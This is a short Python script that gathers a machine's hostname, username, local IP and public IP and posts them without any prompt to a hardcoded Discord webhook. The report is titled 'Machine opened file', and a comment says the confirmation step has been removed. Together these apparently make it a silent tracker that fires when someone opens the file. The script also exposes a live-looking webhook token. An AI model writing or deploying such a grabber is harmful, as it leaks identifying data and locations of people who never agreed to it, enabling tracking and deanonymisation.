import requests
import socket
import getpass
import json

def get_public_ip(timeout=5):
    try:
        r = requests.get("https://api.ipify.org", timeout=timeout)
        r.raise_for_status()
        return r.text.strip()
    except requests.RequestException:
        return "Could not retrieve public IP"

def get_local_ip():
    """
    Attempts to discover the machine's primary local IP address
    (works even if hostname resolves to 127.0.0.1).
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # doesn't actually send data; used to pick the default interface
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        # fallback
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return "Could not determine local IP"

def get_machine_info():
    info = {
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "local_ip": get_local_ip(),
        "public_ip": get_public_ip()
    }
    return info

def send_to_discord(webhook_url, info):
    content = (
        f"Machine opened file:\n"
        f"- Hostname: {info['hostname']}\n"
        f"- Username: {info['username']}\n"
        f"- Local IP: {info['local_ip']}\n"
        f"- Public IP: {info['public_ip']}"
    )
    embed = {
        "title": "Machine Information",
        "description": content,
        "color": 16711680,  # Red color
        "fields": [
            {
                "name": "Hostname",
                "value": info['hostname'],
                "inline": True
            },
            {
                "name": "Username",
                "value": info['username'],
                "inline": True
            },
            {
                "name": "Local IP",
                "value": info['local_ip'],
                "inline": True
            },
            {
                "name": "Public IP",
                "value": info['public_ip'],
                "inline": True
            }
        ],
        "footer": {
            "text": "Machine Info Retrieval"
        }
    }
    payload = {"embeds": [embed]}
    try:
        r = requests.post(webhook_url, json=payload, timeout=5)
        r.raise_for_status()
        print("Sent to Discord successfully.")
    except requests.RequestException as e:
        print(f"Failed to send to Discord: {e}")

if __name__ == "__main__":
    # Replace or confirm this is your webhook. Don't post someone else's webhook publicly.
    WEBHOOK_URL = "https://discord.com/api/webhooks/1419174869412872274/rEnQOZX-0V3itAJQN6IfQPTVDnD-2WZJsN8IS-EJjGDdN-m_QV7tWZx-wtl_Iwh8Cpxe"

    info = get_machine_info()
    print("Collected info (will be sent to the webhook):")
    for k, v in info.items():
        print(f"  {k}: {v}")

    # Remove the confirmation step
    send_to_discord(WEBHOOK_URL, info)
